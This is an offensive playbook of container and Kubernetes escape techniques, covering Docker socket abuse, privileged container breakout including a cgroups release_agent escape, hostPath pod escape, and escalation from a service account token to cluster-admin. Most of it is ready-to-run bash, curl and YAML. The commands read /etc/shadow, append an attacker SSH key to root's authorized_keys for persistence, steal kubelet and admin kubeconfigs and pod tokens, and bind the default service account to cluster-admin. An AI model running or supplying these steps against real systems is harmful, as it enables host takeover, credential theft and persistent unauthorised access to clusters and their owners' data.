# Cloud – Container & Kubernetes Escape

### Docker Socket Escape — Host Takeover via Mounted Socket [added: 2026-04]
- **Tags:** #Docker #ContainerEscape #DockerSocket #PrivEsc #HostTakeover #VolumeMount #ChrootBreakout
- **Trigger:** Compromised container and `/var/run/docker.sock` is mounted inside the container (check with `ls -la /var/run/docker.sock`)
- **Prereq:** Shell inside a container + `/var/run/docker.sock` accessible (mounted as volume) + Docker CLI or curl available inside the container
- **Yields:** Full root access to the host filesystem and ability to run arbitrary commands as root on the host
- **Opsec:** High
- **Context:** When the Docker socket is mounted into a container (common in CI/CD, monitoring, and Docker-in-Docker setups), anyone inside the container can talk to the Docker daemon on the host. This means you can spin up a new privileged container that mounts the host root filesystem.
- **Payload/Method:**
  ```bash
  # Confirm Docker socket is available
  ls -la /var/run/docker.sock

  # If docker CLI is available inside the container
  docker images
  docker run -v /:/hostfs -it --privileged alpine chroot /hostfs /bin/bash

  # If only curl is available — use Docker API directly
  # List containers
  curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json | jq .

  # Create a privileged container mounting host root
  curl -s -X POST --unix-socket /var/run/docker.sock \
    -H "Content-Type: application/json" \
    "http://localhost/containers/create?name=pwned" \
    -d '{"Image":"alpine","Cmd":["/bin/sh","-c","chroot /hostfs /bin/bash -c \"id; cat /etc/shadow\""],"Mounts":[{"Type":"bind","Source":"/","Target":"/hostfs"}],"HostConfig":{"Privileged":true}}'

  # Start the container
  curl -s -X POST --unix-socket /var/run/docker.sock \
    "http://localhost/containers/pwned/start"

  # Read output
  curl -s --unix-socket /var/run/docker.sock \
    "http://localhost/containers/pwned/logs?stdout=true&stderr=true"

  # For persistent access — write SSH key to host
  docker run -v /:/hostfs --privileged alpine \
    sh -c 'echo "ssh-rsa AAAA... attacker@kali" >> /hostfs/root/.ssh/authorized_keys'
  ```

### Privileged Container Breakout — Host Filesystem Access [added: 2026-04]
- **Tags:** #Docker #Privileged #ContainerEscape #nsenter #DevMount #HostMount #PrivEsc #LinuxCapabilities
- **Trigger:** Compromised container is running with `--privileged` flag (check with `cat /proc/self/status | grep CapEff` — all caps = `0000003fffffffff`)
- **Prereq:** Shell inside a container running with `--privileged` + host device access (`/dev/sda1` or similar)
- **Yields:** Full root access to the host filesystem, ability to read/write any file on the host, execute commands as host root
- **Opsec:** High
- **Context:** Privileged containers have all Linux capabilities and can see host devices. You can mount the host disk directly or use nsenter to enter the host's PID namespace. Common in monitoring agents, logging sidecars, and misconfigured workloads.
- **Payload/Method:**
  ```bash
  # Check if container is privileged (all capabilities set)
  cat /proc/self/status | grep CapEff
  # Privileged: CapEff: 0000003fffffffff

  # Method 1: Mount host disk
  fdisk -l  # Find host disk (usually /dev/sda1 or /dev/nvme0n1p1)
  mkdir -p /mnt/host
  mount /dev/sda1 /mnt/host
  # Now browse the host filesystem
  ls /mnt/host/root/
  cat /mnt/host/etc/shadow
  # Write SSH key for persistence
  echo "ssh-rsa AAAA... attacker@kali" >> /mnt/host/root/.ssh/authorized_keys

  # Method 2: nsenter into host PID 1 namespace (most reliable)
  nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
  # You are now root on the host
  hostname
  id
  cat /etc/shadow

  # Method 3: cgroups escape (if nsenter/mount not available)
  mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
  echo 1 > /tmp/cgrp/x/notify_on_release
  host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
  echo "$host_path/cmd" > /tmp/cgrp/release_agent
  echo '#!/bin/sh' > /cmd
  echo "cat /etc/shadow > $host_path/output" >> /cmd
  chmod a+x /cmd
  sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
  cat /output
  ```

### Kubernetes Pod Escape via hostPath Mount [added: 2026-04]
- **Tags:** #Kubernetes #K8s #PodEscape #hostPath #VolumeMount #NodeTakeover #PodSpec #RBAC #ContainerEscape
- **Trigger:** Have permission to create pods (or found an existing pod with hostPath volume mounting `/` or sensitive host directories)
- **Prereq:** `kubectl` access with pod create permissions OR shell in a pod with hostPath volume already mounted to host filesystem
- **Yields:** Read/write access to the Kubernetes node's filesystem — credentials, kubelet config, other pod secrets, SSH keys
- **Opsec:** High
- **Context:** If you can create a pod with a hostPath volume (or find one already configured), you can mount the node's root filesystem into the pod. This is a direct path from pod compromise to node compromise. Common in clusters with weak PodSecurityPolicy/Standards.
- **Payload/Method:**
  ```bash
  # Check if current pod already has hostPath mounts
  mount | grep -E "ext4|xfs"
  ls /host  # Common mount point

  # If you have kubectl — create a pod with hostPath: /
  cat <<'YAML' | kubectl apply -f -
  apiVersion: v1
  kind: Pod
  metadata:
    name: node-pwn
    namespace: default
  spec:
    containers:
    - name: pwn
      image: alpine
      command: ["/bin/sh", "-c", "sleep 999999"]
      volumeMounts:
      - name: hostroot
        mountPath: /hostfs
      securityContext:
        privileged: true
    volumes:
    - name: hostroot
      hostPath:
        path: /
        type: Directory
    hostNetwork: true
    hostPID: true
  YAML

  # Exec into the pod
  kubectl exec -it node-pwn -- /bin/sh

  # Access host filesystem
  chroot /hostfs /bin/bash
  cat /etc/shadow
  cat /var/lib/kubelet/config.yaml

  # Steal kubelet credentials
  cat /hostfs/var/lib/kubelet/kubeconfig
  cat /hostfs/etc/kubernetes/admin.conf  # If this is a control plane node

  # Read all pod secrets on the node
  find /hostfs/var/lib/kubelet/pods/ -name "token" -exec cat {} \;
  ```

### Kubernetes Service Account Token to Cluster Admin [added: 2026-04]
- **Tags:** #Kubernetes #K8s #ServiceAccount #RBAC #ClusterAdmin #TokenAbuse #APIServer #PrivEsc #SecretMount
- **Trigger:** Compromised a pod and found the auto-mounted service account token — want to enumerate and escalate Kubernetes RBAC permissions
- **Prereq:** Shell inside a Kubernetes pod + service account token mounted (default at `/var/run/secrets/kubernetes.io/serviceaccount/`) + API server reachable from the pod
- **Yields:** Kubernetes API access as the pod's service account — potentially cluster-admin if SA is over-permissioned or if RBAC escalation path exists
- **Opsec:** Med
- **Context:** Every pod gets a service account token mounted by default (unless explicitly disabled). Many clusters have over-permissioned service accounts, default accounts with broad roles, or allow token-based escalation paths. Start by checking what the SA can do, then look for escalation.
- **Payload/Method:**
  ```bash
  # Read the mounted service account token and CA cert
  export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
  export CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
  export NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
  export APISERVER="https://kubernetes.default.svc"

  # Check who you are
  curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
    "$APISERVER/apis/authentication.k8s.io/v1/tokenreviews" \
    -X POST -H "Content-Type: application/json" \
    -d "{\"apiVersion\":\"authentication.k8s.io/v1\",\"kind\":\"TokenReview\",\"spec\":{\"token\":\"$TOKEN\"}}" | jq .status.user

  # Check what you can do (self subject access review)
  # If kubectl is available:
  kubectl auth can-i --list --token=$TOKEN

  # Via API — check for broad permissions
  curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/namespaces" | jq .
  curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/secrets" | jq .
  curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" "$APISERVER/apis/rbac.authorization.k8s.io/v1/clusterroles" | jq .

  # List all secrets in the namespace (may contain other SA tokens or creds)
  curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
    "$APISERVER/api/v1/namespaces/$NAMESPACE/secrets" | jq '.items[].metadata.name'

  # If you can create rolebindings — escalate to cluster-admin
  cat <<'YAML' | kubectl apply -f - --token=$TOKEN
  apiVersion: rbac.authorization.k8s.io/v1
  kind: ClusterRoleBinding
  metadata:
    name: pwn-cluster-admin
  roleRef:
    apiGroup: rbac.authorization.k8s.io
    kind: ClusterRole
    name: cluster-admin
  subjects:
  - kind: ServiceAccount
    name: default
    namespace: default
  YAML

  # Verify cluster-admin
  kubectl auth can-i '*' '*' --all-namespaces --token=$TOKEN
  ```
